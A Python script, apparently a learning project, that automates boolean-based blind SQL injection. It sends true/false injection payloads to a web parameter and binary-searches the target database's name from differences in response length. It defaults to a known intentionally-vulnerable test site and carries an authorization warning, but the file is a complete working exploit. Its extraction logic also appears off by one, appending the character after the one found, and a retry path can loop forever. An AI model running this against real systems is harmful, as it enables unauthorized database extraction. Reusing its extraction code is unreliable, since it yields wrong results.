#!/usr/bin/env python3
"""
Project #9: Automated Boolean-Based Blind SQL Injection Inference Engine
Architecture: Binary Search character matching via differential length metrics.
"""

import sys
import time
import argparse
import requests

BANNER = """
======================================================================
  ETHICAL WARNING: For authorized vulnerability verification and 
  educational application analysis only. Do not use without permission.
======================================================================
"""

def verify_vulnerability(base_url: str, param: str) -> tuple[bool, int]:
    """Evaluates behavioral differences between True and False query logic."""
    print("[*] Phase 1: Conducting structural differential analysis...")
    
    # 1. Establish baseline condition
    try:
        res_base = requests.get(f"{base_url}?{param}=1", timeout=10)
        baseline_len = len(res_base.text)
    except Exception as e:
        print(f"❌ Failed to reach target infrastructure: {e}")
        return False, 0

    # 2. Inject structural TRUE payload
    payload_true = f"1' AND '1'='1"
    res_true = requests.get(f"{base_url}?{param}={payload_true}", timeout=10)
    time.sleep(0.5)

    # 3. Inject structural FALSE payload
    payload_false = f"1' AND '1'='2"
    res_false = requests.get(f"{base_url}?{param}={payload_false}", timeout=10)
    time.sleep(0.5)

    # Evaluate the differential indicator
    if len(res_true.text) != len(res_false.text) and len(res_true.text) == baseline_len:
        print(f"[+] Differential indicator located. True length: {len(res_true.text)} | False length: {len(res_false.text)}")
        return True, len(res_true.text)
        
    return False, 0

def extract_database_name(base_url: str, param: str, true_length: int) -> str:
    """Extracts target database identifiers via optimized binary search inference."""
    print("\n[*] Phase 2: Deploying Binary Search extraction matrix...")
    extracted_string = ""
    
    # Iterate through characters sequentially
    for char_index in range(1, 20):  # Cap search ceiling at 20 characters
        low = 32   # Lower bound of printable ASCII spectrum
        high = 126 # Upper bound of printable ASCII spectrum
        matched_char_ascii = 0

        while low <= high:
            mid = (low + high) // 2
            
            # Construct standard database inference payload string
            # payload: 1' AND ASCII(SUBSTRING(DATABASE(),X,1)) > Y -- -
            payload = f"1' AND ASCII(SUBSTRING(DATABASE(),{char_index},1))>{mid}-- -"
            
            # Issue throttled request
            try:
                response = requests.get(f"{base_url}?{param}={payload}", timeout=10)
                time.sleep(0.5)
            except Exception as e:
                print(f"\n⚠️ Socking routing error encountered: {e}")
                continue

            # Check if response structural behavior matches the TRUE baseline template
            if len(response.text) == true_length:
                # The character ASCII value sits above our test value
                low = mid + 1
            else:
                # The character ASCII value sits equal to or below our test value
                matched_char_ascii = mid
                high = mid - 1

        # A zero result at the lower bound means the string tracker has terminated
        if matched_char_ascii == 32 or matched_char_ascii == 0:
            break

        # Since our query logic evaluates strict inequality (value > mid)
        # the baseline target match converges exactly one step above the final checked condition
        actual_char = chr(matched_char_ascii + 1)
        extracted_string += actual_char
        print(f" [Char {char_index}] Found: '{actual_char}' (ASCII {ord(actual_char)}) -> Current: {extracted_string}")

    return extracted_string

if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser(description="Boolean-Based Blind SQLi Profiler")
    parser.add_argument("--url", default="http://testphp.vulnweb.com/artists.php", help="Target URL path")
    parser.add_argument("--param", default="artist", help="Parameter flag to analyze")
    args = parser.parse_args()

    is_vulnerable, true_len = verify_vulnerability(args.url, args.param)
    
    if is_vulnerable:
        print("🚨 STRUCTURAL INJECTION VECTOR VALIDATED.")
        db_name = extract_database_name(args.url, args.param, true_len)
        print(f"\n🎉 Extraction Complete! Database Name: {db_name}")
    else:
        print("[-] Target parameter did not exhibit standard boolean differential traits.") 